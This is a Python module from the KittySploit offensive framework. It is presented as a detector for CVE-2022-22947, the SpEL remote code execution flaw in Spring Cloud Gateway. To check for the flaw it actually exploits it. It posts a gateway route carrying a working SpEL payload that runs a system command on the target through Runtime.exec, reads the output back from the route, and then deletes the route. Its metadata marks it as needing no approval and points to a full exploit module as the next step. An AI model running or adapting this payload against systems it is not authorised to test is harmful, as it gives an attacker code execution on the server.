#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Spring Cloud Gateway Actuator SpEL RCE (CVE-2022-22947)."""

import json
import re
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Spring Cloud Gateway - Actuator SpEL RCE Detection (CVE-2022-22947)',
        'description': (
            'Detects CVE-2022-22947 by creating a Gateway route with a SpEL '
            'AddResponseHeader filter via /actuator/gateway/routes, refreshing, and '
            'reading command output from the route definition.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2022', 'spring', 'gateway', 'rce',
            'spel', 'actuator', 'unauth', 'kev', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 4,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.2,
            'noise': 0.6,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'exploits/multi/http/spring_cloud_gateway_cve_2022_22947_rce',
                ],
            },
        },
        'references': [
            'https://tanzu.vmware.com/security/cve-2022-22947',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-22947',
        ],
        'cve': 'CVE-2022-22947',
    }

    base_path = OptString('', 'Optional base path prefix', required=False)

    def _p(self, path: str) -> str:
        base = str(self.base_path or '').strip()
        if not base or base == '/':
            return path
        if not base.startswith('/'):
            base = '/' + base
        return base.rstrip('/') + path

    def run(self):
        name = secrets.token_hex(4)
        route = self._p(f'/actuator/gateway/routes/{name}')
        data = {
            'id': name,
            'filters': [{
                'name': 'AddResponseHeader',
                'args': {
                    'name': 'Result',
                    'value': (
                        "#{new String(T(org.springframework.util.StreamUtils)"
                        ".copyToByteArray(T(java.lang.Runtime).getRuntime()"
                        '.exec(new String[]{"id"}).getInputStream()))}'
                    ),
                },
            }],
            'uri': 'http://example.com',
            'order': 0,
        }
        create = self.http_request(
            method='POST',
            path=route,
            data=json.dumps(data),
            headers={'Content-Type': 'application/json'},
            allow_redirects=False,
        )
        if not create or create.status_code != 201:
            return False
        self.http_request(
            method='POST',
            path=self._p('/actuator/gateway/refresh'),
            data='',
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            allow_redirects=False,
        )
        get = self.http_request(method='GET', path=route, allow_redirects=False)
        # cleanup
        self.http_request(method='DELETE', path=route, allow_redirects=False)
        self.http_request(
            method='POST',
            path=self._p('/actuator/gateway/refresh'),
            data='',
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            allow_redirects=False,
        )
        if get and re.search(r'uid=\d+', get.text or ''):
            self.set_info(
                severity='critical',
                reason='Spring Cloud Gateway CVE-2022-22947 SpEL RCE confirmed',
                path=route,
            )
            return True
        return False
